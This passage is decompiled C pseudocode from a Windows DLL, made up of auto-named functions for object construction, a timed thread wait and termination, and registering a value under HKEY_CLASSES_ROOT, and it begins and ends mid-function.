        v9 = !sub_10020EC4((int)v23, (int)j);
        LOBYTE(v30) = 16;
        sub_100511C9(v24);
        if ( !v9 )
          break;
        v5 = sub_10020DE6(v23, v21);
        LOBYTE(v30) = 18;
        v6 = sub_1000D687((int)v5) != 0;
        LOBYTE(v30) = 16;
        sub_1000D3AD(v21);
        if ( v6 )
        {
          v8 = sub_10020DE6(v23, v20);
          LOBYTE(v30) = 19;
          (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)(a1 + 4) + 36))(a1 + 4, v8);
          LOBYTE(v30) = 16;
          sub_1000D3AD(v20);
        }
        sub_10020DC5(v23, v7);
      }
      LOBYTE(v30) = 15;
      sub_100511C9(v23);
      LOBYTE(v30) = 9;
      sub_10020C49(v27);
    }
    else
    {
      v11 = sub_10020DE6(v18, v22);
      LOBYTE(v30) = 20;
      v12 = sub_1000D687((int)v11) != 0;
      LOBYTE(v30) = 9;
      sub_1000D3AD(v22);
      if ( v12 )
      {
        v13 = sub_10020DE6(v18, v19);
        LOBYTE(v30) = 21;
        (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)(a1 + 4) + 36))(a1 + 4, v13);
        LOBYTE(v30) = 9;
        sub_1000D3AD(v19);
      }
    }
    v15 = !v15;
    sub_10020DC5(v18, v10);
  }
  LOBYTE(v30) = 8;
  sub_100511C9(v18);
  LOBYTE(v30) = 3;
  sub_10020C49(v28);
  LOBYTE(v30) = 2;
  sub_100511C9(v26);
  v30 = -1;
  sub_10020C49(v29);
}
// 1004D8AB: variable 'v7' is possibly undefined
// 1004D998: variable 'v10' is possibly undefined
// 1004D670: using guessed type int var_60[21];
// 1004D670: using guessed type int var_11C[7];
// 1004D670: using guessed type int var_B0[20];
// 1004D670: using guessed type int var_1AC[7];
// 1004D670: using guessed type int var_138[7];
// 1004D670: using guessed type int var_100[20];
// 1004D670: using guessed type int var_170[7];
// 1004D670: using guessed type int var_154[7];

//----- (1004DA4B) --------------------------------------------------------
_DWORD *__stdcall sub_1004DA4B(_DWORD *a1, void *Block, int a3, void *a4)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  int v8; // ecx
  void *v10[2]; // [esp+10h] [ebp-20h] BYREF
  void *v11[5]; // [esp+18h] [ebp-18h] BYREF
  int v12; // [esp+2Ch] [ebp-4h]
  _DWORD *Blocka; // [esp+3Ch] [ebp+Ch]

  sub_1000ADE9(a1);
  v12 = 0;
  a1[26] = Block;
  *a1 = &off_101042D8;
  a1[27] = a3;
  a1[28] = 8;
  sub_10024DF2(a1 + 29);
  sub_100522FD(a1 + 33, (int)(a1 + 29));
  sub_10006814(a1 + 39);
  LOBYTE(v12) = 3;
  sub_100185CD(a4, (int)v11);
  LOBYTE(v12) = 4;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v11[0] + 4))(v11[0]) )
  {
    Blocka = operator new(0x10u);
    LOBYTE(v12) = 5;
    if ( Blocka )
    {
      v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)v11[0] + 12))(v11[0]);
      v5 = sub_1005218B(Blocka, v4, (int)(a1 + 29));
    }
    else
    {
      v5 = 0;
    }
    LOBYTE(v12) = 4;
    v6 = sub_10039112(v10, (int)v5);
    LOBYTE(v12) = 6;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(a1[33] + 36))(a1 + 33, v6);
    LOBYTE(v12) = 4;
    sub_1003406C(v10);
    v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)v11[0] + 12))(v11[0]);
    (*(void (__thiscall **)(_DWORD *, int))(a1[39] + 36))(a1 + 39, v7);
    sub_10021F56(v8, (int)v11[0]);
  }
  LOBYTE(v12) = 3;
  sub_10007D7A(v11);
  return a1;
}
// 1004DB24: variable 'v8' is possibly undefined
// 101042D8: using guessed type int (__thiscall *off_101042D8)(void *Block, char);

//----- (1004DB4F) --------------------------------------------------------
int *__thiscall sub_1004DB4F(int *Block, char a2)
{
  sub_1004DB6B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004DB6B) --------------------------------------------------------
void __thiscall sub_1004DB6B(int *this)
{
  *this = (int)&off_101042D8;
  sub_100068A5(this + 39);
  sub_10052373(this + 33);
  sub_10024E24(this + 29);
  sub_1000AE39(this);
}
// 101042D8: using guessed type int (__thiscall *off_101042D8)(void *Block, char);

//----- (1004DBC1) --------------------------------------------------------
int __usercall sub_1004DBC1@<eax>(__int32 a1@<eax>, int a2@<ecx>)
{
  unsigned int v3; // eax
  unsigned int v4; // esi
  int v6; // ecx
  int v7; // edi
  _DWORD *v8; // esi
  DWORD v9; // eax
  int v10; // ecx
  DWORD v11; // edi
  int v13; // [esp-10h] [ebp-44h]
  int v14; // [esp-8h] [ebp-3Ch] BYREF
  int v15; // [esp-4h] [ebp-38h]
  HANDLE Handles[2]; // [esp+10h] [ebp-24h] BYREF
  void *v17; // [esp+18h] [ebp-1Ch]
  int v18; // [esp+1Ch] [ebp-18h]
  int v19; // [esp+20h] [ebp-14h]
  int v20; // [esp+30h] [ebp-4h]

  v18 = a2;
  sub_10029BC2(a1);
  Handles[0] = hHandle;
  Handles[1] = (HANDLE)dword_1017DB10;
  v3 = *(_DWORD *)(a2 + 104) / 0x3Cu;
  v17 = (void *)(*(_DWORD *)(a2 + 104) % 0x3Cu);
  v4 = v3 + (v17 != 0);
  v19 = 60;
  do
  {
    if ( !v4-- )
      break;
    v7 = sub_100523A3((int *)(a2 + 132));
    if ( v7 != -1 )
    {
      v20 = 0;
      v15 = v6;
      v14 = v6;
      v17 = &v14;
      sub_1000728E(&v14, 0);
      LOBYTE(v20) = 1;
      v8 = (_DWORD *)dword_10182DE8;
      v13 = (*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 156) + 44))(a2 + 156);
      LOBYTE(v20) = 0;
      sub_1004F292(v8, 101, v13, v7, v14);
      v20 = -1;
LABEL_14:
      sub_1004DD05(a2);
      break;
    }
    if ( !v4 && v17 )
      v19 = (int)v17;
    v9 = WaitForMultipleObjectsEx(2u, Handles, 0, 1000 * v19, 1);
    v11 = v9;
    if ( v9 == 1 || v9 == 258 && !v4 )
    {
      v15 = v10;
      v14 = v10;
      v17 = &v14;
      sub_1000728E(&v14, 0);
      v20 = -1;
      sub_1004F7E6((_DWORD *)dword_10182DE8, 100, (v11 != 258) + 1, v14, v15);
      goto LABEL_14;
    }
  }
  while ( v9 );
  CloseHandle(*(HANDLE *)(a2 + 108));
  return 0;
}
// 1004DC2B: variable 'v6' is possibly undefined
// 1004DCBA: variable 'v10' is possibly undefined
// 1017DB10: using guessed type int dword_1017DB10;
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1004DD05) --------------------------------------------------------
DWORD __usercall sub_1004DD05@<eax>(int a1@<esi>)
{
  DWORD result; // eax

  SetEvent(hEvent);
  result = WaitForSingleObjectEx(hHandle, 0xEA60u, 1);
  if ( result == 258 )
    return TerminateThread(*(HANDLE *)(a1 + 108), *(_DWORD *)(a1 + 112));
  return result;
}

//----- (1004DD38) --------------------------------------------------------
char __cdecl sub_1004DD38(void *a1, void *a2)
{
  HANDLE v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  HANDLE CurrentThread; // [esp-18h] [ebp-48h]
  HANDLE CurrentProcess; // [esp-14h] [ebp-44h]
  HANDLE TargetHandle; // [esp+18h] [ebp-18h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  v9 = 0;
  TargetHandle = 0;
  CurrentProcess = GetCurrentProcess();
  CurrentThread = GetCurrentThread();
  v2 = GetCurrentProcess();
  if ( !DuplicateHandle(v2, CurrentThread, CurrentProcess, &TargetHandle, 0, 0, 2u) )
    return 0;
  v3 = operator new(0xACu);
  LOBYTE(v9) = 1;
  if ( v3 )
    v4 = sub_1004DA4B(v3, a1, (int)TargetHandle, a2);
  else
    v4 = 0;
  dword_101308C8 = (int)v4;
  LOBYTE(v9) = 2;
  (*(void (__thiscall **)(_DWORD *))(*v4 + 60))(v4);
  v9 = -1;
  return 1;
}
// 101308C8: using guessed type int dword_101308C8;

//----- (1004DDEE) --------------------------------------------------------
_DWORD *__stdcall sub_1004DDEE(_DWORD *a1, _DWORD *Block, void *a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  _DWORD *v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  void *v12; // esi
  _DWORD *v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  int v17; // eax
  int v18; // ecx
  _DWORD *v19; // eax
  int v21[4]; // [esp+10h] [ebp-44h] BYREF
  int v22; // [esp+20h] [ebp-34h] BYREF
  LONG v23; // [esp+24h] [ebp-30h] BYREF
  int v24; // [esp+28h] [ebp-2Ch] BYREF
  LONG v25; // [esp+2Ch] [ebp-28h] BYREF
  void *v26[2]; // [esp+30h] [ebp-24h] BYREF
  void *v27[2]; // [esp+38h] [ebp-1Ch] BYREF
  int v28[4]; // [esp+40h] [ebp-14h] BYREF
  int v29; // [esp+50h] [ebp-4h]

  *a1 = off_1010433C;
  a1[1] = off_100FBF5C;
  a1[1] = &off_10104340;
  sub_10018FD5(a1 + 2, 0x10u);
  sub_1004F1C4(a1 + 6);
  v29 = 4;
  sub_1001C041((int)(a1 + 10));
  sub_10024DF2(a1 + 11);
  sub_100522FD(a1 + 15, (int)(a1 + 11));
  v27[1] = a1 + 21;
  a1[21] = off_100FBF5C;
  a1[21] = &off_101043DC;
  sub_1001160C(a1 + 22, 0x10u);
  sub_10018FD5(a1 + 26, 0x10u);
  LOBYTE(v29) = 11;
  sub_1004E5E7(Block, (int)v26);
  LOBYTE(v29) = 12;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v26[0] + 4))(v26[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v26[0] + 12))(v26[0]);
    sub_100185CD((void *)(v3 + 16), (int)v27);
    LOBYTE(v29) = 14;
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v27[0] + 4))(v27[0]) )
    {
      sub_1000D17D(&v22, &word_1017DB80);
      LOBYTE(v29) = 15;
      sub_1000D17D(&v24, &word_1017DB80);
      LOBYTE(v29) = 17;
      v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)v26[0] + 12))(v26[0]);
      sub_10001236((LONG *)(v4 + 4), &v23);
      v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)v26[0] + 12))(v26[0]);
      sub_10001236((LONG *)(v5 + 12), &v25);
      v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)v27[0] + 12))(v27[0]);
      v7 = a1 + 1;
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int))(a1[1] + 8))(a1 + 1, v6) )
      {
        v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)v27[0] + 12))(v27[0]);
        v9 = (*(int (__thiscall **)(_DWORD *, int))(*v7 + 16))(a1 + 1, v8);
        (*(void (__thiscall **)(int, int *))(*(_DWORD *)v9 + 36))(v9, &v22);
      }
      else
      {
        sub_1000A11B(v21);
        LOBYTE(v29) = 18;
        sub_10009BF4(v21, (int)&v22);
        v10 = (*(int (__thiscall **)(void *))(*(_DWORD *)v27[0] + 12))(v27[0]);
        (*(void (__thiscall **)(_DWORD *, int, int *))(*v7 + 24))(a1 + 1, v10, v21);
        LOBYTE(v29) = 17;
        sub_100099A2(v21);
      }
      LOBYTE(v29) = 14;
      sub_10009DB0(&v22);
      sub_10021F56(v11, (int)v27[0]);
    }
    LOBYTE(v29) = 12;
    sub_10007D7A(v27);
    v12 = v26[0];
    if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)v26[0] + 4))() )
    {
      v13 = sub_1000E8EF(&Block);
      LOBYTE(v29) = 13;
      sub_100078FE((int)v13);
    }
    (*(void (__thiscall **)(void *))(*(_DWORD *)v12 + 16))(v12);
  }
  LOBYTE(v29) = 11;
  sub_10007D7A(v26);
  v28[0] = 0;
  sub_100185CD(a3, (int)v27);
  LOBYTE(v29) = 19;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v27[0] + 4))(v27[0]) )
  {
    Block = operator new(0x10u);
    LOBYTE(v29) = 20;
    if ( Block )
    {
      v14 = (*(int (__thiscall **)(void *))(*(_DWORD *)v27[0] + 12))(v27[0]);
      v15 = sub_1005218B(Block, v14, (int)(a1 + 11));
    }
    else
    {
      v15 = 0;
    }
    LOBYTE(v29) = 19;
    v16 = sub_10039112(&v24, (int)v15);
    LOBYTE(v29) = 21;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(a1[15] + 36))(a1 + 15, v16);
    LOBYTE(v29) = 19;
    sub_1003406C((void **)&v24);
    v17 = (*(int (__thiscall **)(void *))(*(_DWORD *)v27[0] + 12))(v27[0]);
    (*(void (__thiscall **)(_DWORD *, int *, int))(a1[21] + 24))(a1 + 21, v28, v17);
    sub_10021F56(v18, (int)v27[0]);
    ++v28[0];
  }
  LOBYTE(v29) = 11;
  sub_10007D7A(v27);
  v19 = operator new(8u);
  Block = v19;
  LOBYTE(v29) = 22;
  if ( v19 )
  {
    *v19 = &off_10102A30;
    v19[1] = 131097;
  }
  else
  {
    v19 = 0;
  }
  LOBYTE(v29) = 11;
  sub_1001F430((_DWORD *)dword_1017E02C, (int)v19);
  return a1;
}
// 1004DF90: variable 'v11' is possibly undefined
// 1004E079: variable 'v18' is possibly undefined
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102A30: using guessed type int (__thiscall *off_10102A30)(void *Block, char);
// 1010433C: using guessed type int (__thiscall *off_1010433C[2])(void *Block, char);
// 10104340: using guessed type int (__thiscall *off_10104340)(void *Block, char);
// 101043DC: using guessed type int (__thiscall *off_101043DC)(void *Block, char);
// 1017E02C: using guessed type int dword_1017E02C;
// 1004DDEE: using guessed type int var_44[4];
// 1004DDEE: using guessed type int var_14[4];

//----- (1004E0DC) --------------------------------------------------------
_DWORD *__thiscall sub_1004E0DC(_DWORD *Block, char a2)
{
  sub_1004E0F8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004E0F8) --------------------------------------------------------
void __thiscall sub_1004E0F8(_DWORD *this)
{
  *this = off_1010433C;
  sub_1004EFCD(this + 21);
  sub_10052373(this + 15);
  sub_10024E24(this + 11);
  sub_1004EE42(this + 1);
}
// 1010433C: using guessed type int (__thiscall *off_1010433C[2])(void *Block, char);

//----- (1004E149) --------------------------------------------------------
int __stdcall sub_1004E149(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  int v5[6]; // [esp+10h] [ebp-50h] BYREF
  int v6[4]; // [esp+28h] [ebp-38h] BYREF
  int v7[2]; // [esp+38h] [ebp-28h] BYREF
  int v8[2]; // [esp+40h] [ebp-20h] BYREF
  int v9; // [esp+48h] [ebp-18h] BYREF
  LONG v10[4]; // [esp+4Ch] [ebp-14h] BYREF
  int v11; // [esp+5Ch] [ebp-4h]

  v2 = sub_1000D5FF(v7, (int)&unk_10193998, dword_101939A0);
  v11 = 0;
  sub_1000D5FF(v8, (int)v2, a1);
  LOBYTE(v11) = 2;
  sub_1000D3AD(v7);
  sub_1000D17D(&v9, &word_10130814);
  LOBYTE(v11) = 4;
  sub_10020A26((int)v6, (int)v8);
  LOBYTE(v11) = 5;
  sub_1000D17D(v7, &word_10130818);
  LOBYTE(v11) = 6;
  sub_1002168B((char *)v6, (int)v5, (int)v7);
  LOBYTE(v11) = 8;
  sub_1000D3AD(v7);
  v3 = sub_1002307A((unsigned __int8 *)v5, v7);
  LOBYTE(v11) = 9;
  sub_10001236(v3 + 1, v10);
  LOBYTE(v11) = 8;
  sub_1000D3AD(v7);
  LOBYTE(v11) = 5;
  sub_100511C9(v5);
  LOBYTE(v11) = 4;
  sub_100215F9(v6);
  v11 = 3;
  if ( sub_1000D65C(a2, (int)&v9) )
  {
    LOBYTE(v11) = 2;
    sub_1000D3AD(&v9);
    v11 = -1;
    sub_1000D3AD(v8);
    return 2;
  }
  else
  {
    LOBYTE(v11) = 2;
    sub_1000D3AD(&v9);
    v11 = -1;
    sub_1000D3AD(v8);
    return 0;
  }
}
// 101939A0: using guessed type _DWORD dword_101939A0[2];
// 1004E149: using guessed type int var_38[4];
// 1004E149: using guessed type int var_50[6];
// 1004E149: using guessed type LONG var_14[4];

//----- (1004E2B2) --------------------------------------------------------
int __stdcall sub_1004E2B2(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v3[2]; // [esp+10h] [ebp-2Ch] BYREF
  int v4[2]; // [esp+18h] [ebp-24h] BYREF
  int v5[6]; // [esp+20h] [ebp-1Ch] BYREF
  int v6; // [esp+38h] [ebp-4h]

  v1 = sub_1000D5FF(v4, (int)&unk_10193998, a1);
  v6 = 0;
  sub_1000D5FF(v5, (int)v1, dword_101939A8);
  LOBYTE(v6) = 2;
  sub_1000D3AD(v4);
  LOBYTE(v6) = 3;
  sub_10020A26((int)v3, (int)v5);
  LOBYTE(v6) = 3;
  sub_100215F9(v3);
  v6 = -1;
  sub_1000D3AD(v5);
  return 0;
}
// 101939A8: using guessed type _DWORD dword_101939A8[2];
// 1004E2B2: using guessed type int var_1C[6];

//----- (1004E345) --------------------------------------------------------
int __userpurge sub_1004E345@<eax>(int a1@<esi>, HKEY phkResult)
{
  int v2; // ebx
  const BYTE *v4; // edi
  size_t v5; // eax
  int v6; // [esp-4h] [ebp-38h]
  int v7[2]; // [esp+10h] [ebp-24h] BYREF
  HKEY v8[2]; // [esp+18h] [ebp-1Ch] BYREF
  DWORD dwDisposition[4]; // [esp+20h] [ebp-14h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  v2 = 0;
  dwDisposition[0] = 0;
  sub_1000D5FF(v7, (int)phkResult, dword_101939A8);
  v10 = 0;
  phkResult = 0;
  if ( RegCreateKeyExW(HKEY_CLASSES_ROOT, *(LPCWSTR *)(v7[1] + 12), 0, 0, 1u, 0xF003Fu, 0, &phkResult, dwDisposition) )
  {
    v6 = 4;
    goto LABEL_3;
  }
  if ( dwDisposition[0] == 2 )
  {
LABEL_6:
    v6 = 6;
    goto LABEL_3;
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011B1D(v8, (int)phkResult);
  LOBYTE(v10) = 1;
  if ( sub_1000D687(a1) > 0xFF )
  {
    LOBYTE(v10) = 0;
    sub_10011DDD(v8);
    goto LABEL_6;
  }
  v4 = *(const BYTE **)(*(_DWORD *)(a1 + 4) + 12);
  v5 = sub_1000D687(a1);
  if ( !RegSetValueExW(v8[1], &ValueName, 0, 1u, v4, 2 * v5 + 2) )
  {
    LOBYTE(v10) = 0;
    sub_10011DDD(v8);
    goto LABEL_4;
  }
  LOBYTE(v10) = 0;
  sub_10011DDD(v8);
  v6 = 5;
LABEL_3:
  v2 = v6;
LABEL_4:
  v10 = -1;
  sub_1000D3AD(v7);
  return v2;
}
// 101939A8: using guessed type _DWORD dword_101939A8[2];
// 1004E345: using guessed type DWORD dwDisposition[4];

//----- (1004E439) --------------------------------------------------------
int __userpurge sub_1004E439@<eax>(__int32 a1@<eax>, _DWORD *a2, HKEY phkResult)
{
  int *v3; // esi
  char v4; // bl
  int v5; // eax
  void *v6; // eax
  _DWORD *v7; // edi
  int v8; // ecx
  int v9; // eax
  _DWORD *v10; // esi
  int v11; // ecx
  _DWORD *v12; // esi
  int v14; // [esp-18h] [ebp-48h]
  char LastError; // [esp-14h] [ebp-44h]
  int v16; // [esp-10h] [ebp-40h] BYREF
  int v17; // [esp-Ch] [ebp-3Ch]
  void **v18; // [esp-8h] [ebp-38h]
  void *v19[2]; // [esp+10h] [ebp-20h] BYREF
  int v20; // [esp+18h] [ebp-18h] BYREF
  char v21; // [esp+1Fh] [ebp-11h]
  int v22; // [esp+2Ch] [ebp-4h]

  sub_10029BC2(a1);
  v22 = 0;
  v3 = a2 + 1;
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, HKEY))(a2[1] + 8))(a2 + 1, phkResult) )
  {
    v4 = 0;
    v21 = 0;
    v18 = v19;
    v5 = *v3;
    v17 = (int)phkResult;
    v6 = (void *)(*(int (__thiscall **)(int *))(v5 + 16))(v3);
    sub_1004E5E7(v6, v17);
    LOBYTE(v22) = 1;
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v19[0] + 4))(v19[0]) && !v4 )
    {
      v7 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v19[0] + 12))(v19[0]);
      if ( !sub_1004E149(v7, (int)(v7 + 2)) )
      {
        if ( sub_1004E2B2(phkResult) == 3 )
        {
          v20 = -1;
          v9 = sub_100523A3(a2 + 15);
          if ( &v20 )
            v20 = v9;
          if ( v9 != -1 )
          {
            LOBYTE(v22) = 3;
            sub_10029BB6((__int32)&phkResult + 3, (int)&phkResult + 3);
            v17 = v11;
            v16 = v11;
            sub_1000728E(&v16, 0);
            LOBYTE(v22) = 4;
            v12 = (_DWORD *)dword_10182DE8;
            v14 = (*(int (__thiscall **)(_DWORD *))(a2[21] + 16))(a2 + 21);
            LOBYTE(v22) = 3;
            sub_1004FCD8(v12, 107, (int)phkResult, v14, (int)&v20, v16);
            v22 = 0;
            sub_10007D7A(v19);
            v16 = 11;
            return (int)v18;
          }
          if ( sub_1004E345((int)v7, phkResult) )
          {
            v17 = v8;
            v16 = v8;
            sub_1000728E(&v16, 0);
            LOBYTE(v22) = 2;
            v10 = (_DWORD *)dword_10182DE8;
            LastError = GetLastError();
            LOBYTE(v22) = 1;
            sub_1004FAF4(v10, 106, (int)phkResult, (int)v7, LastError, v16, v17);
            LOBYTE(v22) = 0;
            sub_10007D7A(v19);
            v17 = 8;
            return (int)v18;
          }
        }
        v4 = 1;
        v21 = 1;
      }
      sub_10009E64(v8, (int)v19[0]);
    }
    LOBYTE(v22) = 0;
    sub_10007D7A(v19);
    return v4 != 0 ? 0 : 7;
  }
  else
  {
    return 10;
  }
}
// 1004E4FD: variable 'v8' is possibly undefined
// 1004E54D: variable 'v11' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1004E439: using guessed type int var_18;

//----- (1004E5E7) --------------------------------------------------------
int __thiscall sub_1004E5E7(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1004E615) --------------------------------------------------------
int __thiscall sub_1004E615(int this, int a2)
{
  sub_100185CD((void *)(this + 4), a2);
  return a2;
}

//----- (1004E646) --------------------------------------------------------
int __thiscall sub_1004E646(int this, int a2)
{
  sub_10037CF0((void *)(this + 20), a2);
  return a2;
}

//----- (1004E677) --------------------------------------------------------
_DWORD *__thiscall sub_1004E677(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_1004E78A(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1004E6E8) --------------------------------------------------------
int __thiscall sub_1004E6E8(int this, int a2)
{
  sub_100185CD((void *)(this + 20), a2);
  return a2;
}

//----- (1004E719) --------------------------------------------------------
_DWORD *__thiscall sub_1004E719(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_1004E85B(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1004E78A) --------------------------------------------------------
_DWORD *__stdcall sub_1004E78A(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_1010441C;
  a1[2] = off_1010437C;
  sub_1000D17D(a1 + 3, (wchar_t *)&word_10102960);
  sub_1000A11B(a1 + 5);
  a1[9] = 0;
  return a1;
}
// 1010437C: using guessed type int (__thiscall *off_1010437C[2])(void *Block, char);
// 1010441C: using guessed type int (__stdcall *off_1010441C)(char);

//----- (1004E7E4) --------------------------------------------------------
void __thiscall sub_1004E7E4(_DWORD *this)
{
  ++this[9];
}

//----- (1004E7E8) --------------------------------------------------------
void __cdecl __noreturn sub_1004E7E8(int a1, int a2)
{
  int v2; // eax
  char v3[16]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  v2 = sub_1000E950((int)v3);
  v4 = 0;
  sub_10007DD5(v2, 164);
}
// 1004E7E8: using guessed type char var_14[16];

//----- (1004E80D) --------------------------------------------------------
void __thiscall sub_1004E80D(int *this)
{
  *this = (int)off_1010437C;
  sub_100099A2(this + 3);
  sub_1000D3AD(this + 1);
}
// 1010437C: using guessed type int (__thiscall *off_1010437C[2])(void *Block, char);

//----- (1004E842) --------------------------------------------------------
int __thiscall sub_1004E842(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1004E85B) --------------------------------------------------------
_DWORD *__stdcall sub_1004E85B(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_1010443C;
  a1[2] = &off_10104418;
  sub_1000D17D(a1 + 4, (wchar_t *)&word_10102960);
  a1[6] = 0;
  return a1;
}
// 10104418: using guessed type int (__thiscall *off_10104418)(void *Block, char);
// 1010443C: using guessed type int (__stdcall *off_1010443C)(char);

//----- (1004E8A9) --------------------------------------------------------
LONG *__thiscall sub_1004E8A9(LONG *this)
{
  LONG *v2; // eax
  int v3; // eax
  LONG v5; // [esp-4h] [ebp-8h]

  v2 = (LONG *)(*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[6]);
  v5 = this[6];
  this[3] = *v2;
  v3 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  sub_10001236((LONG *)(v3 + 4), this + 5);
  return this + 2;
}

//----- (1004E8DD) --------------------------------------------------------
void __thiscall sub_1004E8DD(int *this)
{
  *this = (int)&off_10104418;
  sub_1000D3AD(this + 2);
}
// 10104418: using guessed type int (__thiscall *off_10104418)(void *Block, char);

//----- (1004E904) --------------------------------------------------------
int *__thiscall sub_1004E904(int *this, char a2)
{
  sub_1004E80D(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1004E938) --------------------------------------------------------
int *__thiscall sub_1004E938(int *Block, char a2)
{
  sub_1004E80D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004E954) --------------------------------------------------------
int *__thiscall sub_1004E954(int *this, char a2)
{
  sub_1004E8DD(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1004E988) --------------------------------------------------------
int *__thiscall sub_1004E988(int *Block, char a2)
{
  sub_1004E8DD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004E9A4) --------------------------------------------------------
void __thiscall sub_1004E9A4(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_10104380;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10039F05(this);
}
// 10104380: using guessed type int (__thiscall *off_10104380)(void *Block, char);

//----- (1004EA07) --------------------------------------------------------
void __thiscall sub_1004EA07(_DWORD *this, void *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // edi
  int v8; // [esp+10h] [ebp-24h]
  int v9[5]; // [esp+14h] [ebp-20h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013058F);
  sub_1004F184(a2, v9);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v6 > a3 )
  {
    v7 = 16 * v6;
    v8 = v6 - a3;
    do
    {
      (*(void (__stdcall **)(int))(*(_DWORD *)(this[3] + v7) + 56))(this[3] + v7 - 16);
      v7 -= 16;
      --v8;
    }
    while ( v8 );
  }
  (*(void (__thiscall **)(unsigned int, int *))(*(_DWORD *)(16 * a3 + this[3]) + 56))(16 * a3 + this[3], v9);
  ++this[1];
  v10 = -1;
  sub_100099A2(v9);
}

//----- (1004EAD5) --------------------------------------------------------
int __thiscall sub_1004EAD5(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101305DA);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 16 * a2;
    do
    {
